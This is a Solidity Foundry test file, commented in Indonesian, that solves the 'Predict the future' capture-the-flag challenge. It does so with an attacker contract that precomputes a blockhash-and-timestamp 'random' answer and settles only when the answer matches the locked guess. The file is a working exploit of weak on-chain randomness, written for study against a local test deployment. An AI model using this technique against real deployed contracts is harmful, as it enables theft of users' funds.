// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PredictTheFuture} from "src/PredictTheFuture.sol";

// #5 Predict the future — jawaban settle() dihitung dari
// blockhash(block.number-1) + block.timestamp blok saat settle.
// Tebakan dikunci 2 blok sebelum settle, tapi jawaban blok settle
// bisa dihitung SEBELUM memanggil settle. Tunggu blok yang jawabannya
// == tebakan terkunci, baru settle. Bila tebakan salah, guesser
// di-reset (guesser = address(0)) sehingga bisa coba lagi.
contract PredictTheFutureAttacker {
    PredictTheFuture public target;

    constructor(PredictTheFuture _target) {
        target = _target;
    }

    function lock(uint8 n) external payable {
        target.lockInGuess{value: 1 ether}(n);
    }

    function settle() external {
        target.settle();
    }

    function computeAnswer() external view returns (uint8) {
        return
            uint8(
                uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
            ) % 10;
    }

    receive() external payable {}
}

contract PredictTheFutureSolve is Test {
    PredictTheFuture challenge;
    PredictTheFutureAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        challenge = new PredictTheFuture{value: 1 ether}();
        attacker = new PredictTheFutureAttacker(challenge);
        vm.deal(address(attacker), 10 ether);
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
    }

    function testSolve() public {
        attacker.lock{value: 1 ether}(0);
        uint256 settlement = block.number + 1;
        for (uint256 i = 0; i < 100; i++) {
            vm.roll(block.number + 1);
            // settle() butuh block.number > settlementBlockNumber (lock + 1)
            if (block.number <= settlement) continue;
            if (attacker.computeAnswer() == 0) {
                attacker.settle();
                break;
            }
        }
        assertTrue(challenge.isComplete());
    }
}
